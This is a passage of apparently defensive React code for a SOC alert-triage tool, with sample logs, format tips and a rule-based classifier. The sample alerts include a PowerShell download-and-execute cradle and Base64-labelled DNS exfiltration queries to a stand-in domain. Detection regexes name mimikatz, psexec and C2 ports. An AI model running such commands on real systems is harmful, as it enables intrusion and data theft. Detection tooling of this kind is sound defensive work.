import { useState } from "react";

const SAMPLE_ALERTS = [
  {
    id: 1,
    label: "Brute Force SSH",
    type: "Syslog",
    raw: `Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:19 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:21 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:23 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:25 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2
Jan 15 03:42:27 prod-server sshd[2341]: Failed password for admin from 185.220.101.45 port 52341 ssh2`
  },
  {
    id: 2,
    label: "Suspicious PowerShell",
    type: "Windows Event",
    raw: `EventID: 4104
TimeCreated: 2024-01-15T14:23:11Z
Computer: DESKTOP-A7K2P
User: CORP\\jsmith
ScriptBlockText: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.200/payload.ps1')
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand`
  },
  {
    id: 3,
    label: "DNS Exfiltration",
    type: "DNS Log",
    raw: `Timestamp: 2024-01-15T22:11:04Z
Source: 10.0.0.45
Query: aGVsbG93b3JsZA==.exfil.evilsite.xyz
Query: dGhpcyBpcyBhIHRlc3Q=.exfil.evilsite.xyz
Query: c2Vuc2l0aXZlZGF0YQ==.exfil.evilsite.xyz
Bytes_out: 48291
Unusual_subdomain_entropy: HIGH`
  },
  {
    id: 4,
    label: "Zeek C2 Beacon",
    type: "Zeek/Bro",
    raw: `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto service duration orig_bytes resp_bytes conn_state
1705276800.123456 CRBfPk1234abcd 10.0.0.55 49201 203.0.113.99 4444 tcp - 3600.00 2457600 1024 SF
1705276801.234567 CRBfPk5678efgh 10.0.0.55 49202 203.0.113.99 4444 tcp - 3601.00 2457700 1025 SF`
  },
  {
    id: 5,
    label: "Cobalt Strike IDS",
    type: "Suricata",
    raw: `{
  "timestamp": "2024-01-15T10:33:21.123456+0000",
  "event_type": "alert",
  "src_ip": "10.0.0.22",
  "src_port": 54321,
  "dest_ip": "198.51.100.45",
  "dest_port": 443,
  "proto": "TCP",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 2019401,
    "rev": 4,
    "signature": "ET MALWARE Possible Cobalt Strike Beacon Activity",
    "category": "Malware Command and Control Activity Detected",
    "severity": 1
  }
}`
  },
  {
    id: 6,
    label: "Firewall Block CEF",
    type: "CEF",
    raw: `CEF:0|Palo Alto Networks|PAN-OS|10.1|threat|THREAT|7|src=172.16.0.5 dst=203.0.113.10 spt=12345 dpt=80 proto=TCP act=block cs1=Mimikatz cs1Label=ThreatName deviceAction=block msg=Credential dumping tool detected rt=Jan 15 2024 08:22:11`
  }
];

const FORMAT_GUIDE = [
  {
    name: "Syslog",
    pattern: "<Month> <Day> <Time> <host> <process>[<pid>]: <message>",
    example: "Jan 15 03:42:17 prod-server sshd[2341]: Failed password for root from 185.220.101.45 port 52341 ssh2",
    tips: "Standard Linux/Unix log format. Include multiple lines if they share a source IP or pattern. The more lines you include, the better the pattern detection."
  },
  {
    name: "Windows Event",
    pattern: "EventID: <id>\nTimeCreated: <ISO8601>\nComputer: <host>\nUser: <domain\\user>\n...",
    example: "EventID: 4625\nTimeCreated: 2024-01-15T14:23:11Z\nComputer: DESKTOP-A7K2P\nAccount: CORP\\jsmith\nLogonType: 3",
    tips: "Export from Event Viewer as text or copy from SIEM. EventID is required. Include LogonType for authentication events."
  },
  {
    name: "Suricata / IDS",
    pattern: "JSON eve.log output or alert signature lines",
    example: '{"timestamp":"2024-01-15T10:33:21Z","event_type":"alert","src_ip":"10.0.0.22","dest_ip":"198.51.100.45","alert":{"signature":"ET MALWARE Cobalt Strike"}}',
    tips: "Paste the full JSON block from eve.log, or the raw alert line with signature name, src/dst IPs and ports."
  },
  {
    name: "Zeek / Bro",
    pattern: "TSV log with #fields header or conn.log / dns.log / http.log rows",
    example: "#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto duration orig_bytes\n1705276800.12 Cabc123 10.0.0.5 49201 203.0.113.9 4444 tcp 3600 2457600",
    tips: "Include the #fields header line so column order is clear. conn.log, dns.log, and http.log all work."
  },
  {
    name: "CEF",
    pattern: "CEF:<ver>|<vendor>|<product>|<ver>|<sig>|<name>|<severity>|<extensions>",
    example: "CEF:0|Palo Alto|PAN-OS|10.1|threat|THREAT|7|src=10.0.0.1 dst=1.2.3.4 act=block msg=Mimikatz detected",
    tips: "Used by Palo Alto, ArcSight, and many SIEMs. Include full CEF line with extension fields for best results."
  },
  {
    name: "Splunk / SIEM Export",
    pattern: "Key: Value pairs or raw search result rows",
    example: "index=main sourcetype=sysmon EventCode=1\nImage=C:\\Windows\\System32\\cmd.exe\nCommandLine=cmd.exe /c whoami\nParentImage=explorer.exe",
    tips: "Copy raw event text from Splunk, QRadar, Elastic, etc. Include field names — more context gives better analysis."
  },
  {
    name: "Free-form",
    pattern: "Plain English description with technical indicators included",
    example: "User jsmith logged in from 185.220.101.45 at 3am, ran whoami and net user /domain, then accessed \\\\DC01\\SYSVOL and downloaded ~500MB.",
    tips: "Works but produces lower confidence. Always include IPs, usernames, hostnames, commands, and timestamps when describing an incident."
  }
];

const VALIDATION_RULES = [
  {
    id: "too_short",
    test: (v) => v.trim().length < 25,
    message: "Input is too short to analyze.",
    detail: "Paste at least one full log line or alert. A single word, filename, or partial snippet doesn't contain enough context for triage."
  },
  {
    id: "url_only",
    test: (v) => /^https?:\/\/\S+$/.test(v.trim()),
    message: "A URL alone cannot be analyzed.",
    detail: "Paste the actual log data or alert text — not a link to it. If your SIEM shows a URL for the alert, open it and copy the raw event text from inside."
  },
  {
    id: "base64_only",
    test: (v) => {
      const t = v.trim().replace(/\s/g, "");
      return t.length > 80 && /^[A-Za-z0-9+/]+=*$/.test(t) && t.length % 4 === 0;
    },
    message: "This looks like raw Base64-encoded data with no surrounding context.",
    detail: "If this is an encoded command from a log entry, paste the full log line that contains it — not just the encoded value. If you need to decode it first, do that and then paste the decoded content along with the original log line."
  },
  {
    id: "no_context",
    test: (v) => {
      const t = v.trim();
      const hasIndicator = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|EventID|sshd|powershell|CEF:|alert|signature|Failed|blocked|denied|src=|dst=|uid\b|\.exe|\.ps1|\.sh|action|severity|category|timestamp|proto)/i.test(t);
      return t.split(/\s+/).length < 6 && !hasIndicator;
    },
    message: "Not enough technical context to triage.",
    detail: "The input needs at least a timestamp, source or destination, and an event description. Even a single complete syslog line works — make sure you're pasting the full line, not a fragment."
  }
];

const SEVERITY_CONFIG = {
  CRITICAL: { color: "#ff2d55", bg: "rgba(255,45,85,0.12)", label: "CRITICAL" },
  HIGH:     { color: "#ff9f0a", bg: "rgba(255,159,10,0.12)", label: "HIGH" },
  MEDIUM:   { color: "#ffd60a", bg: "rgba(255,214,10,0.10)", label: "MEDIUM" },
  LOW:      { color: "#30d158", bg: "rgba(48,209,88,0.10)",  label: "LOW" },
  INFORMATIONAL: { color: "#64d2ff", bg: "rgba(100,210,255,0.10)", label: "INFO" }
};

// ── OFFLINE ANALYSIS ENGINE ─────────────────────────────────────────────────

const IP_RE = /\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g;
function uniq(a) { return [...new Set(a.filter(Boolean))]; }
function extractIPs(t) { return uniq(t.match(IP_RE) || []); }

function detectFormat(t) {
  if (/^CEF:\d+\|/i.test(t))                                                    return "CEF";
  if (t.trim().startsWith("{") && /"event_type"|"alert"|"signature"/.test(t))   return "Suricata JSON";
  if (/#fields\s+ts\b/.test(t) || /^\d{10,}\.\d+\s+\S+\s+\d+\.\d+\.\d+\.\d+/m.test(t)) return "Zeek conn.log";
  if (/EventID\s*:\s*\d+/i.test(t))                                             return "Windows Event Log";
  if (/^(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d/m.test(t))      return "Syslog";
  if (/Timestamp:.*\d{4}-\d{2}-\d{2}|Query:\s*\S+\.\S+/i.test(t))             return "DNS Log";
  return "Free-form Narrative";
}

function analyzeOffline(text) {
  const t = text.trim();
  const fmt = detectFormat(t);
  const ips = extractIPs(t);

  const r = {
    severity: "MEDIUM", log_format_detected: fmt,
    summary: "", threat_type: "Suspicious Activity",
    mitre_tactic: "Unknown", mitre_technique: "Unknown",
    iocs: ips, recommended_action: "Investigate and correlate with other events.",
    false_positive_likelihood: "Medium", confidence: 65, analyst_notes: ""
  };

  // ── SYSLOG ──────────────────────────────────────────────────────────────────
  if (fmt === "Syslog") {
    const failCount  = (t.match(/Failed password|authentication failure|Invalid user/gi) || []).length;
    const targets    = uniq((t.match(/Failed password for (?:invalid user )?(\S+)/gi) || [])
                        .map(m => m.replace(/failed password for (?:invalid user )?/i, "").trim()));
    const rootHit    = targets.some(u => /^(root|admin|administrator)$/i.test(u));
    const invalidUsr = /invalid user/i.test(t);

    r.iocs = uniq([...ips, ...targets.map(u => `user:${u}`)]);
    r.mitre_tactic = "Credential Access";
    r.mitre_technique = "T1110.001 - Brute Force: Password Guessing";
    r.threat_type = "Brute Force";

    if (failCount >= 5 && rootHit) {
      Object.assign(r, { severity: "CRITICAL", confidence: 95, false_positive_likelihood: "Low",
        summary: `Brute-force SSH attack: ${failCount} failed attempts against privileged account(s) (${targets.join(", ")}) from ${ips.join(", ")}. Root targeting indicates automated attack with privilege-escalation intent.`,
        recommended_action: `Block ${ips.join(", ")} at the firewall immediately. Verify no "Accepted password" entries follow in auth.log. Enable fail2ban. Rotate credentials for targeted accounts.` });
    } else if (failCount >= 3) {
      Object.assign(r, { severity: "HIGH", confidence: 88, false_positive_likelihood: "Low",
        summary: `SSH brute force: ${failCount} rapid failed logins for "${targets.join(", ")}" from ${ips.join(", ")}. Repeated failures indicate automated credential attack.`,
        recommended_action: `Block ${ips.join(", ")} at perimeter. Confirm no successful logins. Disable password auth in sshd_config and switch to key-only.` });
    } else if (failCount >= 1) {
      Object.assign(r, { severity: "LOW", confidence: 60, false_positive_likelihood: "High",
        summary: `Failed SSH login for "${targets.join(", ")}" from ${ips.join(", ")}. Isolated failure — may be a misconfigured service or one-off attempt.`,
        recommended_action: "Monitor for repeat attempts. No immediate action required." });
    } else if (/sudo|su\b/i.test(t)) {
      Object.assign(r, { threat_type: "Privilege Escalation", mitre_tactic: "Privilege Escalation",
        mitre_technique: "T1548.003 - Sudo and Sudo Caching", severity: "MEDIUM", confidence: 65,
        summary: "Sudo/su usage detected. Verify the user is authorised for elevation.",
        recommended_action: "Review /etc/sudoers and compare against authorised admin list." });
    } else {
      r.summary = "Syslog event — no known attack pattern matched. Review manually.";
      r.confidence = 40;
    }
    if (invalidUsr) r.analyst_notes = "Target username does not exist — consistent with credential stuffing or username enumeration.";
  }

  // ── WINDOWS EVENT LOG ────────────────────────────────────────────────────────
  else if (fmt === "Windows Event Log") {
    const eid      = parseInt((t.match(/EventID\s*:\s*(\d+)/i) || [])[1]) || 0;
    const computer = (t.match(/Computer\s*:\s*(\S+)/i) || [])[1] || "unknown host";
    const user     = (t.match(/User\s*:\s*([\w\\@.]+)/i) || [])[1] || "";
    const cmdLine  = (t.match(/(?:CommandLine|ScriptBlockText)\s*:\s*(.+)/i) || [])[1] || "";
    const dangerPS = /IEX|Invoke-Expression|DownloadString|WebClient|EncodedCommand|FromBase64String|bypass|hidden|noprofile|mimikatz|shellcode/i.test(t);
    const lateral  = /(net\s+use|\\\\[\w.]+\\|psexec|wmic.*\/node)/i.test(t);
    const persist  = /(HKCU|HKLM|\\Run\b|Startup|schtasks|at\.exe)/i.test(t);

    r.iocs = uniq([...ips, user && `user:${user}`, `host:${computer}`, cmdLine && `cmd:${cmdLine.slice(0,80)}`]);

    if ((eid === 4104 || (eid === 4688 && /powershell/i.test(t)))) {
      Object.assign(r, {
        threat_type: dangerPS ? "Malicious PowerShell" : "Suspicious PowerShell",
        mitre_tactic: "Execution", mitre_technique: "T1059.001 - PowerShell",
        severity: dangerPS ? "CRITICAL" : "HIGH", confidence: dangerPS ? 93 : 75,
        false_positive_likelihood: dangerPS ? "Low" : "Medium",
        summary: dangerPS
          ? `Malicious PowerShell on ${computer} (user: ${user}). Script uses download cradle / in-memory execution (IEX/WebClient/EncodedCommand) — common loader technique for second-stage payloads.`
          : `Suspicious PowerShell execution logged on ${computer}. Review script content for indicators.`,
        recommended_action: `Isolate ${computer}. Decode full script block. Hunt for ${ips.join(", ") || "C2 IPs"} across environment. Check persistence (Run keys, scheduled tasks).`
      });
    } else if (eid === 4625) {
      Object.assign(r, { threat_type: "Failed Logon", mitre_tactic: "Credential Access",
        mitre_technique: "T1110 - Brute Force", severity: "MEDIUM", confidence: 68,
        summary: `Windows failed logon (4625) on ${computer} for account ${user || "unknown"}.`,
        recommended_action: "Correlate with other 4625 events to detect brute-force patterns. Check logon type and source network address." });
    } else if (eid === 4688 && lateral) {
      Object.assign(r, { threat_type: "Lateral Movement", mitre_tactic: "Lateral Movement",
        mitre_technique: "T1021 - Remote Services", severity: "HIGH", confidence: 80,
        summary: `Process creation (4688) on ${computer} with lateral movement indicators — remote admin tool or network share access.`,
        recommended_action: "Trace execution chain. Identify source host. Verify against authorised admin activity." });
    } else if (eid === 4688 && persist) {
      Object.assign(r, { threat_type: "Persistence", mitre_tactic: "Persistence",
        mitre_technique: "T1547.001 - Registry Run Keys", severity: "HIGH", confidence: 78,
        summary: `Process on ${computer} is interacting with autostart registry keys or scheduled tasks — possible persistence mechanism.`,
        recommended_action: "Audit Run keys and scheduled tasks on the host. Compare against known-good baseline." });
    } else {
      r.summary = `Windows Event ${eid} on ${computer}. No specific rule matched — review manually.`;
      r.analyst_notes = "Add CommandLine, ParentProcess, or LogonType fields for better classification.";
      r.confidence = 45;
    }
  }

  // ── SURICATA JSON ────────────────────────────────────────────────────────────
  else if (fmt === "Suricata JSON") {
    let p = {};
    try { p = JSON.parse(t); } catch { /**/ }
    const sig      = p.alert?.signature || (t.match(/"signature"\s*:\s*"([^"]+)"/) || [])[1] || "";
    const sev      = p.alert?.severity ?? 3;
    const srcIP    = p.src_ip  || ips[0] || "";
    const dstIP    = p.dest_ip || ips[1] || "";
    const dstPort  = p.dest_port || "";
    const category = p.alert?.category || "";

    r.iocs = uniq([srcIP, dstIP, dstPort && `port:${dstPort}`, sig && `sig:${sig}`]);

    if (/cobalt.?strike/i.test(sig)) {
      Object.assign(r, { threat_type: "Cobalt Strike C2", mitre_tactic: "Command and Control",
        mitre_technique: "T1071.001 - Web Protocols", severity: "CRITICAL", confidence: 92,
        false_positive_likelihood: "Low",
        summary: `Cobalt Strike beacon activity detected from internal host ${srcIP} to ${dstIP}:${dstPort}. Cobalt Strike is a commercial offensive framework widely used in targeted attacks and ransomware operations.`,
        recommended_action: `Isolate ${srcIP} immediately. Capture memory. Block ${dstIP} at perimeter. Hunt all hosts communicating with ${dstIP}. Escalate to IR.` });
    } else if (/malware|trojan|backdoor|\brat\b|beacon|c2/i.test(sig)) {
      Object.assign(r, { threat_type: "Malware / C2", mitre_tactic: "Command and Control",
        mitre_technique: "T1071 - Application Layer Protocol",
        severity: sev <= 1 ? "CRITICAL" : "HIGH", confidence: 85, false_positive_likelihood: "Low",
        summary: `IDS alert: ${sig} — malware traffic from ${srcIP} to ${dstIP}:${dstPort}.`,
        recommended_action: `Investigate ${srcIP} for active infection. Block ${dstIP}. Review process list and network connections on source host.` });
    } else if (/exploit|shellcode|overflow/i.test(sig)) {
      Object.assign(r, { threat_type: "Exploit Attempt", mitre_tactic: "Initial Access",
        mitre_technique: "T1190 - Exploit Public-Facing Application", severity: "HIGH", confidence: 78,
        summary: `Exploit attempt: ${sig} from ${srcIP} targeting ${dstIP}:${dstPort}.`,
        recommended_action: "Verify destination service is patched. Review access logs for exploitation indicators." });
    } else if (/scan|sweep|probe/i.test(sig)) {
      Object.assign(r, { threat_type: "Reconnaissance", mitre_tactic: "Reconnaissance",
        mitre_technique: "T1595 - Active Scanning", severity: "LOW", confidence: 70,
        false_positive_likelihood: "Medium",
        summary: `Network scan from ${srcIP}. Signature: ${sig}.`,
        recommended_action: `Block ${srcIP} if external. If internal, identify the scanning process.` });
    } else {
      r.severity   = sev <= 1 ? "HIGH" : sev <= 2 ? "MEDIUM" : "LOW";
      r.summary    = `IDS alert: ${sig || "unknown"} from ${srcIP} to ${dstIP}.`;
      r.threat_type = category || "IDS Alert";
      r.confidence  = 60;
    }
  }

  // ── ZEEK CONN.LOG ────────────────────────────────────────────────────────────
  else if (fmt === "Zeek conn.log") {
    const bytesOut   = Math.max(...(t.match(/\d{6,}/g) || ["0"]).map(Number));
    const suspPorts  = [4444, 4445, 1337, 6666, 6667, 8888, 31337].filter(p => t.includes(String(p)));
    const durationMs = parseFloat((t.match(/\b(\d{3,})\.\d+\s/) || [])[1]) || 0;

    r.iocs = ips;

    if (durationMs > 3000 && bytesOut > 1_000_000) {
      Object.assign(r, { threat_type: "C2 Beacon", mitre_tactic: "Command and Control",
        mitre_technique: "T1071 - Application Layer Protocol",
        severity: "HIGH", confidence: 83, false_positive_likelihood: "Low",
        summary: `Long-duration connection (${Math.round(durationMs/3600)}h) with high outbound data (${Math.round(bytesOut/1024/1024)}MB) — pattern consistent with C2 beaconing or data staging.`,
        recommended_action: "Capture PCAP for this flow. Identify process on source host. Check destination IP reputation." });
    } else if (suspPorts.length) {
      Object.assign(r, { threat_type: "Suspicious Outbound Connection", mitre_tactic: "Command and Control",
        mitre_technique: "T1571 - Non-Standard Port", severity: "HIGH", confidence: 78,
        summary: `Connection on non-standard port(s) ${suspPorts.join(", ")} — commonly used by C2 frameworks and malware.`,
        recommended_action: "Identify the process on the source host using that port. Check destination IP reputation." });
    } else if (bytesOut > 50_000_000) {
      Object.assign(r, { threat_type: "Potential Data Exfiltration", mitre_tactic: "Exfiltration",
        mitre_technique: "T1048 - Exfiltration Over Alternative Protocol",
        severity: "HIGH", confidence: 70,
        summary: `Large data transfer (${Math.round(bytesOut/1024/1024)}MB) — potential exfiltration.`,
        recommended_action: "Identify what data was transferred. Check DLP policies on source system." });
    } else {
      r.summary = "Zeek flow detected. No high-confidence threat pattern matched.";
      r.analyst_notes = "Add dns.log or http.log entries for better analysis.";
      r.confidence = 45;
    }
  }

  // ── CEF ──────────────────────────────────────────────────────────────────────
  else if (fmt === "CEF") {
    const kv = {};
    (t.match(/(\w+)=([^\s|]+)/g) || []).forEach(f => { const i = f.indexOf("="); kv[f.slice(0,i)] = f.slice(i+1); });
    const threat   = kv.cs1 || kv.ThreatName || kv.msg || "";
    const action   = (kv.act || kv.deviceAction || "").toLowerCase();
    const src      = kv.src || ips[0] || "";
    const dst      = kv.dst || ips[1] || "";
    const blocked  = /block|deny|drop/.test(action);

    r.iocs = uniq([...ips, threat && `threat:${threat}`]);

    if (/mimikatz|lsass|credential.dump|hashdump/i.test(t)) {
      Object.assign(r, { threat_type: "Credential Dumping", mitre_tactic: "Credential Access",
        mitre_technique: "T1003 - OS Credential Dumping",
        severity: blocked ? "HIGH" : "CRITICAL", confidence: 93, false_positive_likelihood: "Low",
        summary: `Credential dumping tool (Mimikatz/lsass) detected on ${src}. Action: ${action || "unknown"}. Even if blocked, presence indicates an attacker with local access attempting credential harvest.`,
        recommended_action: blocked
          ? `Investigate ${src} for active compromise despite the block. Hunt lateral movement. Force credential reset for all accounts cached on ${src}.`
          : `URGENT: Isolate ${src}. Assume all cached credentials are compromised. Force domain-wide password reset. Escalate to IR team.` });
    } else if (/exploit|shellcode|overflow/i.test(t)) {
      Object.assign(r, { threat_type: "Exploit Attempt", mitre_tactic: "Initial Access",
        mitre_technique: "T1190 - Exploit Public-Facing Application",
        severity: blocked ? "MEDIUM" : "HIGH", confidence: 80,
        summary: `Exploit activity from ${src} to ${dst}. ${blocked ? "Blocked." : "Action: " + action}`,
        recommended_action: "Patch the targeted service. Check for successful exploitation indicators on the destination." });
    } else {
      r.severity = blocked ? "LOW" : "MEDIUM";
      r.summary = `CEF event from ${src} to ${dst}. ${threat || kv.msg || "Review raw event."}`;
      r.threat_type = threat || "Security Policy Event";
      r.confidence = 60;
      if (blocked) r.false_positive_likelihood = "High";
    }
  }

  // ── DNS LOG ──────────────────────────────────────────────────────────────────
  else if (fmt === "DNS Log") {
    const queries    = (t.match(/Query:\s*(\S+)/gi) || []).map(q => q.replace(/Query:\s*/i, ""));
    const highEnt    = /entropy.*HIGH|Unusual_subdomain_entropy.*HIGH/i.test(t);
    const b64Subs    = queries.filter(q => /^[A-Za-z0-9+/]{8,}=*\.[a-z]+\.[a-z]+/.test(q));
    const bytesOut   = parseInt((t.match(/Bytes_out:\s*(\d+)/i) || [])[1]) || 0;
    const rootDomain = (queries[0] || "").split(".").slice(-2).join(".");

    r.iocs = uniq([...ips, ...queries.map(q => `dns:${q}`)]);

    if (b64Subs.length > 0 || highEnt) {
      Object.assign(r, { threat_type: "DNS Exfiltration", mitre_tactic: "Exfiltration",
        mitre_technique: "T1048.003 - Exfiltration Over DNS",
        severity: "HIGH", confidence: 90, false_positive_likelihood: "Low",
        summary: `DNS exfiltration detected: Base64-encoded subdomains sent to ${rootDomain || "external domain"}. Stolen data is encoded into DNS query labels to bypass DLP controls. High subdomain entropy confirms anomalous usage.`,
        recommended_action: `Sinkhole the destination domain at DNS resolver. Identify source host (${ips.join(", ")}). Decode subdomain labels to determine exfiltrated data. Hunt for the implant on the source.` });
    } else if (bytesOut > 10_000) {
      Object.assign(r, { threat_type: "DNS Tunneling", mitre_tactic: "Command and Control",
        mitre_technique: "T1071.004 - DNS", severity: "MEDIUM", confidence: 68,
        summary: `Unusual DNS query volume / high outbound bytes — possible DNS tunneling or C2 over DNS.`,
        recommended_action: "Analyse query frequency, length, and uniqueness. Deploy DNS sinkhole if malicious domain confirmed." });
    } else {
      r.summary = "DNS log event. Review query destinations and frequency for anomalies.";
      r.confidence = 50;
    }
  }

  // ── FREE-FORM ────────────────────────────────────────────────────────────────
  else {
    const suspCmd  = /whoami|net\s+user|net\s+localgroup|ipconfig|nmap|mimikatz|psexec|procdump/i.test(t);
    const lateral  = /\\\\[\w.]+\\[a-z$]+|admin\$|ipc\$|wmic.*\/node|psexec/i.test(t);
    const malUrl   = /http:\/\/[^\s"']+\/(payload|shell|rat|agent|beacon|update\.exe|loader)/i.test(t);
    const files    = uniq(t.match(/\b[\w.-]+\.(?:exe|ps1|bat|sh|dll|vbs)\b/gi) || []);
    const hashes   = uniq((t.match(/\b[A-Fa-f0-9]{32,64}\b/g) || []).map(h => `hash:${h}`));

    r.iocs = uniq([...ips, ...files, ...hashes]);

    if (malUrl || lateral) {
      Object.assign(r, { severity: "HIGH", false_positive_likelihood: "Medium", confidence: 65,
        threat_type: malUrl ? "Malware Delivery" : "Lateral Movement",
        mitre_tactic: malUrl ? "Initial Access" : "Lateral Movement",
        mitre_technique: malUrl ? "T1566 - Phishing" : "T1021 - Remote Services",
        summary: `Narrative contains indicators of ${malUrl ? "malware delivery" : "lateral movement"}. IPs: ${ips.join(", ") || "none"}.`,
        recommended_action: "Correlate with endpoint and network logs. Validate source and destination of the activity." });
    } else if (suspCmd) {
      Object.assign(r, { severity: "MEDIUM", confidence: 60,
        threat_type: "Suspicious Command Execution", mitre_tactic: "Discovery",
        mitre_technique: "T1082 - System Information Discovery",
        summary: "Narrative contains suspicious commands (whoami, net user, nmap, etc.) — possible attacker recon or post-exploitation.",
        recommended_action: "Correlate with process creation logs on the affected host." });
    } else {
      Object.assign(r, { severity: "LOW", confidence: 40, false_positive_likelihood: "High",
        summary: "Free-form narrative analysed. No specific threat pattern matched.",
        analyst_notes: "Include specific IPs, usernames, commands, and timestamps for higher-confidence results." });
    }
  }

  return r;
}

// ── END OFFLINE ENGINE ───────────────────────────────────────────────────────

function ScanlineOverlay() {
  return (
    <div style={{
      position: "fixed", inset: 0, pointerEvents: "none", zIndex: 9999,
      background: "repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px)"
    }} />
  );
}

function TerminalCursor() {
  return (
    <span style={{
      display: "inline-block", width: 8, height: "1em",
      background: "#00ff88", marginLeft: 2, verticalAlign: "middle",
      animation: "blink 1s step-end infinite"
    }} />
  );
}

function FormatGuide({ open, onToggle }) {
  const [active, setActive] = useState(0);
  const f = FORMAT_GUIDE[active];
  return (
    <div style={{ marginBottom: 24, border: "1px solid #1a2e24", background: "#0a1410" }}>
      <button onClick={onToggle} style={{
        width: "100%", background: "transparent", border: "none", cursor: "pointer",
        display: "flex", alignItems: "center", justifyContent: "space-between",
        padding: "12px 16px", fontFamily: "inherit", color: "#5a8a6a"
      }}>
        <span style={{ fontSize: 10, letterSpacing: 2 }}>// INPUT FORMAT GUIDE — ACCEPTED LOG TYPES & EXAMPLES</span>
        <span style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 1 }}>{open ? "▲ COLLAPSE" : "▼ EXPAND"}</span>
      </button>
      {open && (
        <div style={{ padding: "0 16px 20px 16px", animation: "fadeIn 0.2s ease" }}>
          <p style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7, marginBottom: 16, marginTop: 4 }}>
            This tool accepts any standard security log format. Select a format below to see the expected pattern and a real example. If your log type isn't listed, try <strong style={{color:"#c9d8d3"}}>Free-form</strong> — include as many technical details as possible.
          </p>
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginBottom: 16 }}>
            {FORMAT_GUIDE.map((fmt, i) => (
              <button key={i} onClick={() => setActive(i)} style={{
                background: active === i ? "rgba(0,255,136,0.08)" : "transparent",
                border: `1px solid ${active === i ? "#00ff88" : "#1a2e24"}`,
                color: active === i ? "#00ff88" : "#5a8a6a",
                padding: "4px 12px", fontSize: 10, cursor: "pointer",
                letterSpacing: 1, fontFamily: "inherit", transition: "all 0.15s"
              }}>{fmt.name}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 10 }}>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>PATTERN</div>
              <div style={{ fontSize: 11, color: "#5a8a6a", background: "#080c0e", padding: "8px 12px", border: "1px solid #0f1e18", whiteSpace: "pre-wrap" }}>{f.pattern}</div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>EXAMPLE</div>
              <div style={{ fontSize: 11, color: "#c9d8d3", background: "#080c0e", padding: "8px 12px", border: "1px solid #0f1e18", whiteSpace: "pre-wrap", lineHeight: 1.7 }}>{f.example}</div>
            </div>
            <div>
              <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 5 }}>TIPS</div>
              <div style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7 }}>ℹ {f.tips}</div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function ValidationErrors({ issues }) {
  return (
    <div style={{ border: "1px solid #ff9f0a", background: "rgba(255,159,10,0.05)", padding: 16, marginBottom: 20, animation: "fadeIn 0.2s ease" }}>
      <div style={{ fontSize: 10, color: "#ff9f0a", letterSpacing: 2, marginBottom: 12 }}>⚠ INPUT ISSUES DETECTED — CANNOT ANALYZE</div>
      {issues.map((issue, i) => (
        <div key={i} style={{ marginBottom: i < issues.length - 1 ? 14 : 0 }}>
          <div style={{ fontSize: 12, color: "#ff9f0a", marginBottom: 5 }}>✗ {issue.message}</div>
          <div style={{ fontSize: 11, color: "#7a8a80", lineHeight: 1.7, paddingLeft: 12, borderLeft: "2px solid #2a1a08" }}>{issue.detail}</div>
        </div>
      ))}
      <div style={{ marginTop: 14, paddingTop: 12, borderTop: "1px solid #1a1208", fontSize: 10, color: "#3a5a48" }}>
        → Expand the <span style={{ color: "#5a8a6a" }}>FORMAT GUIDE</span> above to see accepted formats and examples.
      </div>
    </div>
  );
}

function InputDiagnosis({ diagnosis }) {
  return (
    <div style={{ border: "1px solid #ff2d5566", background: "rgba(255,45,85,0.05)", padding: 20, marginBottom: 24, animation: "fadeIn 0.2s ease" }}>
      <div style={{ fontSize: 10, color: "#ff2d55", letterSpacing: 2, marginBottom: 12 }}>✗ ANALYSIS FAILED — AI INPUT DIAGNOSIS</div>
      <div style={{ fontSize: 12, color: "#c9d8d3", lineHeight: 1.8, marginBottom: 16 }}>{diagnosis.problem}</div>
      {diagnosis.suggestions?.length > 0 && (
        <div style={{ marginBottom: diagnosis.example ? 16 : 0 }}>
          <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 8 }}>HOW TO FIX</div>
          {diagnosis.suggestions.map((s, i) => (
            <div key={i} style={{ fontSize: 11, color: "#5a8a6a", lineHeight: 1.7, paddingLeft: 12, marginBottom: 4, borderLeft: "2px solid #1a2e24" }}>→ {s}</div>
          ))}
        </div>
      )}
      {diagnosis.example && (
        <div>
          <div style={{ fontSize: 10, color: "#3a5a48", letterSpacing: 2, marginBottom: 6 }}>SUGGESTED FORMAT</div>
          <div style={{ fontSize: 11, color: "#c9d8d3", background: "#080c0e", padding: "10px 12px", border: "1px solid #1a2e24", whiteSpace: "pre-wrap", lineHeight: 1.7 }}>{diagnosis.example}</div>
        </div>
      )}
    </div>
  );
}

export default function SOCTriageTool() {
  const [input, setInput]               = useState("");
  const [result, setResult]             = useState(null);
  const [loading, setLoading]           = useState(false);
  const [loadingStage, setLoadingStage] = useState("");
  const [validationIssues, setValidationIssues] = useState([]);
